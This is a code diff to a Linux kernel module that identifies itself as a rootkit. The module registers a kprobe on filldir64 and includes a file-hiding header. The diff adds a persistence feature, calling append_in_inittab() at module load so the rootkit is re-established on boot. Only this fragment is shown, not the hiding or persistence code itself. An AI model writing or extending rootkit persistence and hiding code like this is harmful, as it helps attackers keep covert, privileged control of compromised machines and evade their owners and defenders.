@@ -17,6 +17,7 @@
 #include "include/driver.h"
 #include "include/hide.h"
 #include "include/kprobe.h"
+#include "include/persistance.h"
 
 // Define the license and other module information
 MODULE_LICENSE("GPL");
@@ -64,6 +65,13 @@ static int __init mod_init(void)
     RTK_DEBUG("Kprobe registered\n");
     RTK_DEBUG("filldir64: at %px\n", kp.addr);
     RTK_DEBUG("handler_pre: %px\n", handler_pre);
+
+
+    // Setting persistance
+    if (append_in_inittab() < 0) {
+        RTK_DEBUG("[!] failed to add persistence: \n");
+        return -1;
+    }
 
     RTK_DEBUG("Rootkit initialized\n");
 
